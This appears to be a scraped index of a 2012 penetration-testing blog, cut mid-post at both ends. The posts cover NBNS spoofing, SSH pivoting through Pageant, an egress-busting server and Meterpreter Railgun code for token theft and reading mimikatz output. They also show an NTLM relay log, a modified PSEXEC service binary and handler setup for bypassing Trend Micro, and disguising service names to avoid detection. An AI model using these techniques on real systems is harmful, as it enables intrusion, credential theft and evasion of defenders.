something is wrong with the communication because the host doing the lookup doesn’t get the correct resolution back. From what I can google it looks as though Windows Firewall has an ‘Anti-Spoofing’ outbound filter, so these “Bytes sent” don’t even make it to Wireshark. I have created a Github repository, stuck the contents of the zip file in it and this is where I ask for help. If you know 1) how to disable the Windows Anti-spoofing filter or 2) How to circumvent it please leave a comment here, and issue on the repo or email me directly. UPDATE (1\u00262 solved for this use case): /blog/2012/09/02/old-school-on-target-nbns-spoofing-part-2/ The other thing is, if you want to improve the code, that would be awesome too, submit a pull request, I’d love to get this thing going again and make it into something that we can solidly use over a Meterpreter session. Github repo: https://github.com/mubix/FakeNetBIOS And if the only commit to this repo 5 years from now is “Initial commit” then at the very least it will be some where the next blogger who picks up the trail can get it from. P.S. If you know how to solve the issue on XP, that would be an awesome fix as well. UPDATE 2: Looks like the XP issue ahas the Anti-spoofing too. (i.e it works great if you use the IP of the actual IP of the box with different hostnames) I guess the only improvement I’d look for is for an . (ALL HOSTS) ability* ","date":"2012-09-01","objectID":"https://malicious.link/posts/2012/2012-09-01-old-school-on-target-nbns-spoofing/:0:0","tags":null,"title":"Old School On-target NBNS Spoofing","uri":"https://malicious.link/posts/2012/2012-09-01-old-school-on-target-nbns-spoofing/"},{"categories":["metasploit","meterpreter","putty","ssh"],"content":"Watching Egypt’s talk at DEFCON 20 he mentioned the ability to jump on on a system when pageant (puTTY’s ssh-agent equivalent) is running. So I wanted to figure out the best way to get this going. Here is what I came up with: meterpreter \u003e run enum_putty [*] Putty Installed for [[\"Administrator\"]] [*] Saved SSH Server Public Keys: [*] rsa2@22:172.16.10.150 [*] Session corp_webserver: [*] Protocol: SSH [*] Hostname: 172.16.10.150 [*] Username: root [*] Public Key: meterpreter \u003e Awesome, this guy runs as root and we have the IP address. But it doesn’t have any public keys listed. That’s ok because Pageant is running. meterpreter \u003e shell Process 3364 created. Channel 1 created. Microsoft Windows XP [Version 5.1.2600] (C) Copyright 1985-2001 Microsoft Corp. C:\\Program Files\\PuTTY\u003eplink -agent root@172.16.10.150 plink -agent root@172.16.10.150 Welcome to Ubuntu 12.04 LTS (GNU/Linux 2.6.39.1-34 i686) No mail. Last login: Tue Aug 28 14:15:18 2012 from 172.16.10.100 root@172.16.10.150:~]$ id uid=0(root) gid=0(root) groups=0(root) w00t! An extra shell for free!! ","date":"2012-08-28","objectID":"https://malicious.link/posts/2012/2012-08-28-free-shells-with-plink-and-pageant/:0:0","tags":null,"title":"Free Shells with Plink and Pageant","uri":"https://malicious.link/posts/2012/2012-08-28-free-shells-with-plink-and-pageant/"},{"categories":["post exploitation","google docs"],"content":"The post exploitation command lists: Linux/Unix/BSD Post Exploitation: https://docs.google.com/document/d/1ObQB6hmVvRPCgPTRZM5NMH034VDM-1N-EWPRz2770K4/edit Windows Post Exploitation: https://docs.google.com/document/d/1U10isynOpQtrIK6ChuReu-K1WHTJm4fgG3joiuz43rw/edit OSX Post Exploitation: https://docs.google.com/document/d/10AUm_zUdAQGgoHNo_eS0SO1K-24VVYnulUD2x3rJD3k/edit and the newly added Obsucure Syststem’s Post Exploitation: https://docs.google.com/document/d/1CIs6O1kMR-bXAT80U6Jficsqm0yR5dKUfUQgwiIKzgc/edit and Metasploit Post Exploitation: https://docs.google.com/document/d/1ZrDJMQkrp_YbU_9Ni9wMNF2m3nIPEA_kekqqqA2Ywto/edit Have been a weekly upkeep for me with so many… I don’t know what to call it, ‘undesirable edits’ to them. Bad copies, bad pastes, formatting issues and some times deletion or vandalism of the docs. Anyways, I have finally broken down and removed ‘world’ editable permissions. Anyone who has these links can still comment and copy the docs, but they can no longer edit them directly. If you would like to contribute, please shoot me a tweet, a email, a .. anything and I will gladly add you to the permissions to edit. Honestly it just became so overwhelming that every time I thought to add something I would cringe away because I know I’d spend most of time fixing them. Anyway enough of my crying, please if you have stuff to add or are just really good at fixing up formatting, let me know and I’ll add you to the editors list. Thanks, mubix ","date":"2012-08-25","objectID":"https://malicious.link/posts/2012/2012-08-25-post-exploitation-command-lists-request-to-edit/:0:0","tags":null,"title":"Post Exploitation Command Lists - Request to Edit","uri":"https://malicious.link/posts/2012/2012-08-25-post-exploitation-command-lists-request-to-edit/"},{"categories":["egress","iptables","mod_rewrite"],"content":"In the previous post: http://www.room362.com/blog/2012/8/11/let-me-out-of-your-net-workndashintro.html I told you about letmeoutofyour.net, but how does it work? Things we need to accomplish on the server: Listen on all ports Answer for all hostnames and subdomains Answer for all HTTP verbs, file and folder requests ONE: Listen on all ports (I used Linux, so this guide is for such, modifications to other OSs is up to the reader) First you have to get rid of all other services. That’s harder than you would first assume, because you have to admin the box some how. You could toss SSH on a really high port, or have some kind of backend management, or just remove things from running on a multi-IP’d box. It would be impossible in this post to describe every way this is done so I’ll leave it to you to research. Once you have everything gone, install and start Apache or your favorite web server for Linux. Then run this very simple command that I stole from a commenter on the “Forcing Payloads Through Restrictive Firewalls” post: iptables -t nat -I PREROUTING -p tcp -m state --state NEW -d 192.168.1.1 -j DNAT --to 192.168.1.1:80 Where ‘192.168.1.1’ is the IP address of your box. IPv4 NATing just allowed you to listen on every single port by forwarding them all to port 80. That simple. Don’t make the mistake I did and forget to set up alternative management before you set that rule, because if you don’t you’ll be forced to find one. TWO: Answer for all hostnames and subdomains This is pretty easy, DNS has the concept of a wildcard hostname. You simply put an asterisk * in the place of where you would normally put a WWW however you manage your DNS and you’re good. You will also want to add a second record, an ‘@’ is used to reference the domain without a host or subdomain. So the first records makes it answer for things like http://blah.letmeoutofyour.net and the second for http://letmeoutofyour.net/ – Pretty simple ya? THREE: Answer for all HTTP verbs, file and folder requests This is pretty simple as well. Apache’s mod_rewrite to the rescue. Here are the rules: RewriteEngine on RewriteCond %{REQUEST_METHOD} ^(.*) RewriteRule .* index.html [QSA,L] RewriteCond %{DOCUMENT_ROOT} !-f RewriteRule ^(.*)$ index.html [QSA,L] You can either apply this in an .htaccess file or directly in the site configs, up to you. And that’s it. It all seems really simple, but took me a good amount of time putting it all together. Next up, binaries and call backs that use this to wriggle their way out of networks. P.S. This setup throws web scanners through a loop, and if you wanted to be REALLY nasty you could have a bit of php make the index page be an endless 302 or have w00w00t linked to a random page / folder which is generated each time it’s requested. ","date":"2012-08-11","objectID":"https://malicious.link/posts/2012/2012-08-11-let-me-out-of-your-net-server-build/:0:0","tags":null,"title":"LetMeOutOfYour.NET – Server Build","uri":"https://malicious.link/posts/2012/2012-08-11-let-me-out-of-your-net-server-build/"},{"categories":["egress"],"content":"Something that is often useful is a known-good. Something out of the control of your adversary or outside modifiers. But back to that in a sec, egress ‘busting’ or getting your payload/backdoor/trojan/c2 out of someone’s network once you’ve gotten that ever elusive “CODE EXECUTION HAPPY DANCE” going on isn’t always easy. There is even a Metasploit payload for it called ‘allports’: https://community.rapid7.com/community/metasploit/blog/2009/09/24/forcing-payloads-through-restrictive-firewalls There is also ‘Egress Buster’ by the guys over at TrustedSec which can do 1000 ports in just a few seconds: https://www.trustedsec.com/july-2012/egress-buster-reverse-bypassav/ The problem I find with these tools is that they are still straight TCP. *(Yes, yes I know most networks still allow some ports directly outbound) and these tools are still quite valid. During the span between these two tools being released, MrB released a site that listens on all 65k ports: http://open.zorinaq.com/about/ Figured I should merge these ideas and add a few more capabilities (and show you how I did it so you can do so yourself), and so LetMeOutOfYour.net was born. You can hit any subdomain or hostname of letmeoutofyour.net on any port with any HTTP Verb for any resource (web page or folder) and you will always receive a ‘w00tw00t’ back. For example this request (removed the unimportant headers on the request to save space): POST /admin/login.php HTTP/1.1 Host: development.letmeoutofyour.net:8081 username=admin\u0026password=password Will result in this: HTTP/1.1 200 OK Date: Sat, 11 Aug 2012 02:21:54 GMT Server: Apache Last-Modified: Sat, 11 Aug 2012 02:16:55 GMT Accept-Ranges: bytes Content-Length: 9 Vary: Accept-Encoding Keep-Alive: timeout=15, max=100 Connection: Keep-Alive Content-Type: text/html w00tw00t All of those headers are standard Apache headers with the content being just ‘w00tw00t’. Making the connection an HTTP one opens a few doors to things like proxies. It’s ok to cackle at this point. In the following parts I’ll show you how to build the server itself and a binary to find it’s way out of networks. Feel free to point your own domains at the IP it’s hosted on, it can handle it. Have a try, I know you want to: http://youshouldreally.letmeoutofyour.net/before/i/get/angry/and/youwouldntlikemewhenimangry.asp ","date":"2012-08-10","objectID":"https://malicious.link/posts/2012/2012-08-10-let-me-out-of-your-net-intro/:0:0","tags":null,"title":"LetMeOutOfYour.NET – Intro","uri":"https://malicious.link/posts/2012/2012-08-10-let-me-out-of-your-net-intro/"},{"categories":["derbycon","training","cons"],"content":"Egypt and I have decided to give away a spot in our training event at DerbyCon. This won’t come easy though, you have to submit an essay to us with one of the following topics: Essay Topic Options: Why I deserve a free training class How I would social engineer Egypt and Mubix out of a ticket to their class Maximum Length: ~1000 words / 3 pages. (We’re lazy) Submissions sent in direct email, PDF, or Doc(x) (extra points for zero day!) format to: derbyessay@room362.com The due date for a valid submission is 2359 GMT on August 15th, decisions will be made that weekend (August 18th \u0026 19th) and the winner will be announced (and emailed direction how to obtain class info) on the 20th. ** Good luck! – egypt and mubix Also check out corelanc0der’s contest for a spot in his class here: https://www.corelan.be/index.php/2012/08/05/corelan-t-shirt-contest-derbycon-2012/ P.S. Dont’ know what DerbyCon is or the training we are providing? Here are some #lazyweb links: Derbycon: https://www.derbycon.com/ Our training at Derbycon: https://www.derbycon.com/training-courses/#metasploit Outline of the training (it’s changed a bit but generally right): /blog/2012/05/22/derbycon-training-sep-27-28-2012/ ","date":"2012-08-07","objectID":"https://malicious.link/posts/2012/2012-08-07-free-ticket-contest-metasploit-mastery-at-derbycon/:0:0","tags":null,"title":"Free Ticket Contest - Metasploit Mastery at DerbyCon","uri":"https://malicious.link/posts/2012/2012-08-07-free-ticket-contest-metasploit-mastery-at-derbycon/"},{"categories":["metasploit","meterpreter","railgun"],"content":"With the use of Mimikatz and WCE, clear text passwords are much more common. What isn’t always there is the user. They take lunches, go home at a reasonable time and generally aren’t really appreciative of our (pentester/red teamer)’s schedule. A straight forward way, and provided by Microsoft to create a process as a user (whereby having their token readily available is using ‘runas.exe’: w00t, we the user is present, we can migrate our meterepreter session into that notepad and we’re good right? Problem there is you have to interactively input the password, so without a real cmd.exe or RDP session of your own, (VNC payload would work), you’re generally SOL. There are a ton of posted ways around this, most involve make a wrapper script to input the password for you such as this one: (this was pretty unique as it actually sent the keys to the key buffer instead of directly to STDIN) Another way if you don’t mind dropping / creating a custom bin, AutoIT makes this REALLY simple: This could be 2 lines if you really wanted it to be but I like to make things a bit more universal. You could also execute this directly in memory with meterepreter’s execute command with the “-m” argument after you’ve built the AutoIT script into a EXE. But what go through all that trouble? Railgun can do this just as easily. Drop to IRB or create a script that does the following: a = client.railgun.kernel32.GetStartupInfoW(56)[\"lpStartupInfo\"] client.railgun.advapi32.CreateProcessWithLogonW(\"USER\",\"DOMAIN\",\"PASSWORD\",\"LOGON_WITH_PROFILE\",\"notepad.exe\",nil,0,nil,nil,a,32) This will create a notepad.exe process with the defined user. But we can go a bit more stealthy, since we really only need their account token we can just user LogonUser: client.railgun.advapi32.LogonUserA(\"USER\",\"DOMAIN\",\"PASSWORD\",\"LOGON32_LOGON_INTERACTIVE\",\"LOGON32_PROVIDER_DEFAULT\",4) List the tokens available with Incognito, your new user will be there, steal it and you’re done. You now have the ability to user that account/domain token on any of the hosts you’ve compromised on the network, not just the ones they happen to have left themselves logged in. This gets really fun on servers where the admin hasn’t logged in but you wanna grab all of their IE saved passwords ;-) ","date":"2012-07-31","objectID":"https://malicious.link/posts/2012/2012-07-31-raising-zombies-in-windows-part-1-passwords/:0:0","tags":null,"title":"Raising Zombies in Windows: Part 1 - Passwords","uri":"https://malicious.link/posts/2012/2012-07-31-raising-zombies-in-windows-part-1-passwords/"},{"categories":["metasploit","pth","smbrelay"],"content":"Every so often someone writes a Metasploit Module that is pretty epic. Today is one such day: Twitter Link: https://twitter.com/webstersprodigy/status/222529916783169536 Which has a link to here: https://github.com/rapid7/metasploit-framework/pull/589 Demo / Example resource files: https://skydrive.live.com/?cid=19794fac33285fd5\u0026resid=19794FAC33285FD5!170\u0026id=19794FAC33285FD5%21170 You can pull the fork w/ branch from here: https://github.com/webstersprodigy/metasploit-framework/tree/module-http-ntlmrelay And as soon as you do you can start doing this (using the example resource file to put a file, cat it out, enum shares available, list files on a share, then psexec all from a single URL being loaded): 163 address is the Victim I tricked into loading a URL and 182 is the system I want to get onto. This is an HTTP request resulting in a SMB Relay’d auth. It looks as though multiple targets can be used as relay targets but I haven’t tested this out yet. [*] 172.16.10.163 http_ntlmrelay - NTLM Request '/smb_put' from 172.16.10.163:52327 [*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay... [*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded [*] 172.16.10.163 http_ntlmrelay - File \\\\172.16.10.182\\c$\\secret.txt written [*] 172.16.10.163 http_ntlmrelay - NTLM Request '/smb_get' from 172.16.10.163:52328 [*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay... [*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded [*] 172.16.10.163 http_ntlmrelay - Reading 13 bytes from 172.16.10.182 [*] 172.16.10.163 http_ntlmrelay - ----Contents---- [*] 172.16.10.163 http_ntlmrelay - hi ima secret [*] 172.16.10.163 http_ntlmrelay - ----End Contents---- [*] 172.16.10.163 http_ntlmrelay - NTLM Request '/smb_enum' from 172.16.10.163:52329 [*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay... [*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded [*] 172.16.10.163 http_ntlmrelay - Shares enumerated 172.16.10.182 IPC$ ADMIN$ C$ [*] 172.16.10.163 http_ntlmrelay - NTLM Request '/smb_ls' from 172.16.10.163:52330 [*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay... [*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded [*] 172.16.10.163 http_ntlmrelay - Listed 13 files from 172.16.10.182c$ [*] 172.16.10.163 http_ntlmrelay - .rnd [*] 172.16.10.163 http_ntlmrelay - PerfLogs [*] 172.16.10.163 http_ntlmrelay - config.sys [*] 172.16.10.163 http_ntlmrelay - inetpub [*] 172.16.10.163 http_ntlmrelay - xampp [*] 172.16.10.163 http_ntlmrelay - ProgramData [*] 172.16.10.163 http_ntlmrelay - MSOCache [*] 172.16.10.163 http_ntlmrelay - secret.txt [*] 172.16.10.163 http_ntlmrelay - autoexec.bat [*] 172.16.10.163 http_ntlmrelay - Windows [*] 172.16.10.163 http_ntlmrelay - Users [*] 172.16.10.163 http_ntlmrelay - Program Files [*] 172.16.10.163 http_ntlmrelay - NTLM Request '/smb_rm' from 172.16.10.163:52332 [*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay... [*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded [*] 172.16.10.163 http_ntlmrelay - File \\\\172.16.10.182\\c$\\secret.txt deleted [*] 172.16.10.163 http_ntlmrelay - NTLM Request '/smb_pwn' from 172.16.10.163:52333 [*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay... [*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded [*] 172.16.10.163 http_ntlmrelay - Obtraining a service manager handle... [*] 172.16.10.163 http_ntlmrelay - Creating a new service [*] 172.16.10.163 http_ntlmrelay - Closing service handle... [*] 172.16.10.163 http_ntlmrelay - Opening service... [*] 172.16.10.163 http_ntlmrelay - Starting the service... Let the fun begin… ","date":"2012-07-10","objectID":"https://malicious.link/posts/2012/2012-07-10-cross-protocol-chained-pass-the-hash-for-metasploit/:0:0","tags":null,"title":"Cross-Protocol Chained Pass the Hash for Metasploit","uri":"https://malicious.link/posts/2012/2012-07-10-cross-protocol-chained-pass-the-hash-for-metasploit/"},{"categories":["metasploit","trendmicro"],"content":"@jabjorkhaug posed the following question on Twitter today: I figured I could solve this and it would be an interesting challenge. Here is what it gets detected as: The service binary that is used as part of PSEXEC is located here: MSF Directory/data/templates/src/pe/exe/service/service.c The important part to look at starts at line 57: #define WIN32_LEAN_AND_MEAN #include \u003cwindows.h\u003e #define PAYLOAD_SIZE 8192 char cServiceName[32] = \"SERVICENAME\"; char bPayload[PAYLOAD_SIZE] = \"PAYLOAD:\"; SERVICE_STATUS ss; SERVICE_STATUS_HANDLE hStatus = NULL; /* * */ BOOL ServiceHandler( DWORD dwControl ) { if( dwControl == SERVICE_CONTROL_STOP || dwControl == SERVICE_CONTROL_SHUTDOWN ) { ss.dwWin32ExitCode = 0; ss.dwCurrentState = SERVICE_STOPPED; } return SetServiceStatus( hStatus, \u0026ss ); } /* * */ VOID ServiceMain( DWORD dwNumServicesArgs, LPSTR * lpServiceArgVectors ) { CONTEXT Context; STARTUPINFO si; PROCESS_INFORMATION pi; LPVOID lpPayload = NULL; ZeroMemory( \u0026ss, sizeof(SERVICE_STATUS) ); ZeroMemory( \u0026si, sizeof(STARTUPINFO) ); ZeroMemory( \u0026pi, sizeof(PROCESS_INFORMATION) ); si.cb = sizeof(STARTUPINFO); ss.dwServiceType = SERVICE_WIN32_SHARE_PROCESS; ss.dwCurrentState = SERVICE_START_PENDING; ss.dwControlsAccepted = SERVICE_ACCEPT_STOP|SERVICE_ACCEPT_SHUTDOWN; hStatus = RegisterServiceCtrlHandler( (LPCSTR)\u0026cServiceName, (LPHANDLER_FUNCTION)ServiceHandler ); if ( hStatus ) { ss.dwCurrentState = SERVICE_RUNNING; SetServiceStatus( hStatus, \u0026ss ); if( CreateProcess( NULL, \"rundll32.exe\", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, \u0026si, \u0026pi ) ) { Context.ContextFlags = CONTEXT_FULL; GetThreadContext( pi.hThread, \u0026Context ); lpPayload = VirtualAllocEx( pi.hProcess, NULL, PAYLOAD_SIZE, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE ); if( lpPayload ) { WriteProcessMemory( pi.hProcess, lpPayload, \u0026bPayload, PAYLOAD_SIZE, NULL ); #ifdef _WIN64 Context.Rip = (DWORD64)lpPayload; #else Context.Eip = (DWORD)lpPayload; #endif SetThreadContext( pi.hThread, \u0026Context ); } ResumeThread( pi.hThread ); CloseHandle( pi.hThread ); CloseHandle( pi.hProcess ); } ServiceHandler( SERVICE_CONTROL_STOP ); ExitProcess( 0 ); } } /* * */ int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow ) { SERVICE_TABLE_ENTRY st[] = { { (LPSTR)\u0026cServiceName, (LPSERVICE_MAIN_FUNCTIONA)\u0026ServiceMain }, { NULL, NULL } }; return StartServiceCtrlDispatcher( (SERVICE_TABLE_ENTRY *)\u0026st ); } It’s injecting our payload into the service binary and tossing our payload into “rundll32.exe” at run time on the victim (side note: you can change which bin it goes into ;). Lets change this so it doesn’t do any injection and just executes a binary. That removes the ‘injection’ piece and hopefully lets us get our shell. We are loosing a bit of stealth because instead of just one (the service binary) we are writing two binaries. To make this change you replace the above with just this: if( CreateProcess( NULL, \"C:\\evil.exe\", NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, \u0026si, \u0026pi ) ) { CloseHandle( pi.hProcess ); } Compiling this on OSX using mingw is very easy and is very similar on Ubuntu if you have mingw installed: i386-mingw32-gcc -o service.exe service.c Then just copy it to replace the current one: cp service.exe ../../../../template_x86_windows_svc.exe No other changes are needed. Only problem is, how do we get the “evil.exe” up onto the box for it to execute? That’s where the auxiliary module “auxiliary/admin/smb/upload_file” comes in :-) I built a resource file to demo the timeline of getting execution with this new service binary (broken up with comments to explain, remove the comments for it to work): Start Multi Handler use multi/handler set PAYLOAD windows/meterpreter/reverse_http set LHOST 172.16.195.1 set LPORT 80 set ExitOnSession false exploit -j -z Upload file to evil.exe on the C$ share (C$ is default for this module so no reason to set it) use auxiliary/admin/smb/upload_file set LPATH evil.exe set RPATH evil.exe set RHOST 17","date":"2012-07-05","objectID":"https://malicious.link/posts/2012/2012-07-05-bypassing-trend-micros-service-protection/:0:0","tags":null,"title":"Bypassing Trend Micro's Service Protection","uri":"https://malicious.link/posts/2012/2012-07-05-bypassing-trend-micros-service-protection/"},{"categories":["methodology"],"content":"Everyone does things differently, and explaining what goes through an attackers head when they get a shell is virtually impossible and even more so to generalize into a methodology, but I’ve tried to do that with the “3 ‘P’s of Post Exploitation” and they are in a certain order for a reason but certainly up to circumstance to what order is best. The first P is Presence. It is first because the attacker needs to get a sense of what he/she has got before they move on. It plays a crucial part in the other two ‘P’s, making them much stealthier or easier. Many times I’ve seen people jump from box to box and totally miss that what they were looking for was on the first one. So “Presence” is all about discovering what you (the attacker) has already. This has many levels and the order of which the attacker checks them and how is arbitrary as well, but they should have at the very least a check list of categories to check on. Here are some to think about: File System: Knowing “where” to look is tough but in each section below we’ll go into known good places to check and ways to search for files and folders with interesting names and extensions OS: Proxy settings, Group Policy settings, login scripts, MOTD, User lists (net user and /etc/passwd). Knowing how the system and attacker has compromised is a crucial piece to understanding how it communicates and works as a piece to the network. RAM: Mostly known for pulling hashes and credentials out of it, there are a lot of other interesting things that reside solely in memory Media: CDs, DVDs, NFS mounts, SMB mounts, USB sticks. These are often bypassed and forgotten during an attack but can hold the keys to the kingdom Network: Routes, ARP entries, netstat are pretty common to check, but broadcast messages, listeners, and IPv6 are less so. Permissions and Credentials: This is the obvious one but there is usually a mountain of data as even TinyCore linux has hundreds of files, each with their own permissions. This category extends past the borders of the others but important to single out as a separate step. Persistence is achieved at varying levels depending on what the attacker is trying to survive and what the attacker is willing to give up on the stealth side. Staying in memory pretty much kills the attackers chance of surviving a reboot for instance. Tactics to survive a rebuild or revert are also very different. Persistence can also come in the form of simple authentication, if the attacker has a password and it nets him/her code execution or access to the data they are after then that’s all they need. Special focus should be applied to the information gathering section of penetration tests or red team engagements in regards to places that require authentication. Pivoting simple means extending the attackers current access, and can mean anything from connecting to a remote NFS mount to the attacker PSEXEC-ing their Meterpreter payload onto another box that they have administrative access to. This is the last stage because concentration on the previous two is hard to do in the adrenaline high of initial access. Honorable Mention (the mysterious 4th “P”) Privilege Escalation is not part of the Trio because ( then there would be 4 and I wouldn’t know what to call it) while it’s a regular step performed by attackers, it’s something that usually gets too much emphasis. You do not always need Domain Admin access to access the “crown jewels” .These highly privileged accounts should be assumed to be extremely monitored and coveted. (a.k.a. adding a new user to the Domain Admins group is like lighting your hair on fire and running in the front door of the targets office building screeming “h4x!!”) ","date":"2012-06-29","objectID":"https://malicious.link/posts/2012/2012-06-29-presence-persistence-and-pivoting/:0:0","tags":null,"title":"Presence, Persistence, and Pivoting","uri":"https://malicious.link/posts/2012/2012-06-29-presence-persistence-and-pivoting/"},{"categories":["metasploit","meterpreter"],"content":"Submitted it to MSF via pull request here: https://github.com/rapid7/metasploit-framework/pull/538 Added to trunk: https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/tcpnetstat.rb I promised this one a while ago, sorry for the delay. This only does TCP, it’d be trivial to do UDP as well but never really found anything interesting and actively going on on the UDP side. It’s real simple, first we’ve gotta add the GetTcpTable function to railgun: session.railgun.add_function('iphlpapi', 'GetTcpTable', 'DWORD', [ ['PBLOB', 'pTcpTable', 'out'], ['PDWORD', 'pdwSize', 'inout'], ['BOOL', 'bOrder', 'in'] ]) Then gauge the size of the table: getsize = session.railgun.iphlpapi.GetTcpTable(4,4,true) buffersize = getsize['pdwSize'] Run the call again with the correct buffer size: tcptable = session.railgun.iphlpapi.GetTcpTable(buffersize,buffersize,true) Then it’s all just parsing the result. Also pretty straight forward. First we get the number of entries which is held in the first 4 bytes, then just parse the MIB_TCPTABLE one MIB_TCPROW at a time (translating the state to something readable): def parse_tcptable(buffer) entries = buffer[0,4].unpack(\"V*\")[0] print_status(\"Total TCP Entries: #{entries}\") rtable = Rex::Ui::Text::Table.new( 'Header' =\u003e 'Routing Table', 'Indent' =\u003e 2, 'Columns' =\u003e ['STATE', 'LHOST', 'LPORT', 'RHOST', 'RPORT'] ) offset = 4 (1..entries).each do x = {} x[:state] = case buffer[(offset + 0), 4].unpack(\"V*\")[0] when 1 'CLOSED' when 2 'LISTEN' when 3 'SYN_SENT' when 4 'SYN_RCVD' when 5 'ESTABLISHED' when 6 'FIN_WAIT1' when 7 'FIN_WAIT2' when 8 'CLOSE_WAIT' when 9 'CLOSING' when 10 'LAST_ACK' when 11 'TIME_WAIT' when 12 'DELETE_TCB' else 'UNDEFINED' end x[:lhost] = Rex::Socket.addr_itoa(buffer[(offset + 4), 4].unpack(\"N\")[0]) x[:lport] = buffer[(offset + 8), 4].unpack(\"n\")[0] x[:rhost] = Rex::Socket.addr_itoa(buffer[(offset + 12), 4].unpack(\"N\")[0]) if x[:state] == \"LISTEN\" x[:rport] = \"_\" else x[:rport] = buffer[(offset + 16), 4].unpack(\"n\")[0] end offset = offset + 20 rtable \u003c\u003c [x[:state], x[:lhost], x[:lport], x[:rhost], x[:rport]] end print_status(rtable.to_s) end ","date":"2012-06-28","objectID":"https://malicious.link/posts/2012/2012-06-28-netstat-post-module-for-meterpreter/:0:0","tags":null,"title":"Netstat Post Module for Meterpreter","uri":"https://malicious.link/posts/2012/2012-06-28-netstat-post-module-for-meterpreter/"},{"categories":["incident response","psexec"],"content":"Was messing with the Windows service binaries in Metasploit today and I noticed something unique I hadn’t noticed before. For the PSEXEC module, the service name (actually just the display name, ‘service name’ is random) always started with an uppercase ‘M’. Curious to why that was I looked and found Line 246 of the PSEXEC module to be the culprit: I can guess why the M is there. Might be just a quirk with old Windows versions that didn’t allow lowercase service names, not sure. Lets change it a bit. Looking around my XP VM I found the perfect one to emulate ;-) So, quick edit to make it say display name = ‘System Events Notification’ (added the (s) because services can’t have the same display name) and WA LA! A less visually detectable psexec run. However, how often do you look at your Event logs? ;-) ","date":"2012-06-25","objectID":"https://malicious.link/posts/2012/2012-06-25-evidence-of-compromise-metasploits-psexec/:0:0","tags":null,"title":"Evidence of Compromise - Metasploit's PSEXEC","uri":"https://malicious.link/posts/2012/2012-06-25-evidence-of-compromise-metasploits-psexec/"},{"categories":["internet","tools"],"content":"Penetration Testing / Red Teaming requires the use of a lot of tools. I don’t mind getting called a “script kiddie” because I can accomplish more and faster when I don’t have to code every single task I need to do. This post is to point out companies that make this possible and give a small bit of thanks. (If you’ve ever tried to convince a company to give something away for free, you can understand how big this really is) Some give a lot, some only one tool, but even one is more than some. Of course the first is going to be Rapid7 and the Metasploit team: https://github.com/rapid7/metasploit-framework Other company’s free tools sections: Sunera: http://security.sunera.com/p/tools.html Immunity Inc: http://immunityinc.com/resources-freesoftware.shtml SecureState: http://www.securestate.com/Research%20and%20Innovation/Pages/Tools.aspx Core Security: http://corelabs.coresecurity.com/index.php?module=Wiki\u0026action=list\u0026type=tool Hex-Rays: http://www.hex-rays.com/products/ida/support/download_freeware.shtml Spider Labs: https://www.trustwave.com/spiderLabs-tools.php and https://github.com/SpiderLabs RandomStorm: http://www.randomstorm.com/free-security-tools.php SensePost: http://www.sensepost.com/labs/tools/pentest Mc^H^H Foundstone: http://www.mcafee.com/us/downloads/free-tools/index.aspx Stach and Liu: http://www.stachliu.com/resources/tools/ Secure Ideas: http://www.secureideas.net/publications.php (Projects on the right) Buguroo: http://blog.buguroo.com/?cat=6 IOActive: http://ioactive.com/ioactive_labs_tools.html InGuardians: http://www.inguardians.com/tools/ Aspect Security: https://www.aspectsecurity.com/research/appsec_tools/ HP: http://bit.ly/SWFScan_New NirSoft: http://www.nirsoft.net/ Joeware: http://www.joeware.net/freetools/ and of course Micros^H^H^H^H^H^H Sys Internals: http://technet.microsoft.com/en-us/sysinternals/bb842062.aspx If you know of more, please leave a comment below and I’ll add it to the list. ","date":"2012-06-20","objectID":"https://malicious.link/posts/2012/2012-06-20-companies-that-give-back-with-free-tools/:0:0","tags":null,"title":"Companies that give back with free tools","uri":"https://malicious.link/posts/2012/2012-06-20-companies-that-give-back-with-free-tools/"},{"categories":["metasploit","mimikatz","railgun"],"content":"One of the powers of Metasploit is it’s ability to stay memory resident. Through the use of reflective DLL injection even keeping new functionality the attack loads from ever touching disk. Well, the first thing I wanted to do with Mimikatz is get to that same level. Here is my first step to that end; a railgun based Meterpreter script. Now before going all reflective with it I needed to understand how the DLL worked. Thankfully @gentilkiwi stepped in and stopped my head from getting bloody. In this first step we will be removing the need for the mimikatz.exe binary, still needing the DLL to be uploaded, but we’ll get there in the subsequent posts. Ignore the do_cmd for now and I stepped through remote DLL injection here. So the first odd lines is handle = client.railgun.kernel32.CreateNamedPipeW('\\\\\\\\.\\\\pipe\\\\kiwi\\\\mimikatz', 'PIPE_ACCESS_DUPLEX', 'PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT', 1, 0, 0, 30000,nil)['return'] connectedlsass = client.railgun.kernel32.ConnectNamedPipe(handle,nil) Essentially these connect to the Named Pipe that the sekurlsa.dll uses to talk to the mimikatz.exe in it’s normal operation. Then we just use the windows API call “ReadFile” from there on out. client.railgun.kernel32.ReadFile(handle,248,248,4,nil) One of the draw backs to doing this all remotely is that Railgun doesn’t have the memory management insight like the Windows OS does. Being able to know when pipes are ready to be read or written to is a bit of a challenge and the call hangs your IRB / meterpreter session if you get it wrong. I’ve overcome this for the initial “banner” that sekurlsa writes by knowing the exact length (248 bytes in this case) of the text. For subsequent commands like “ping” and “getLogonPasswords” I simply have to read one character at a time, which is a slow process but removes any chance of getting hung. (Two bytes for every Unicode character) If you have any questions on how/why this works or have a better way please leave your comments and questions below or hit me up on twitter! Meterpreter Script: def do_cmd(handle,cmd) ucommand = Rex::Text.to_unicode(cmd) sendcmd = client.railgun.kernel32.WriteFile(handle,ucommand,ucommand.size,4,nil) good2go = false newline = false readstring = [] while good2go == false # Have to pull data 1 unicode character at a time # this is because the 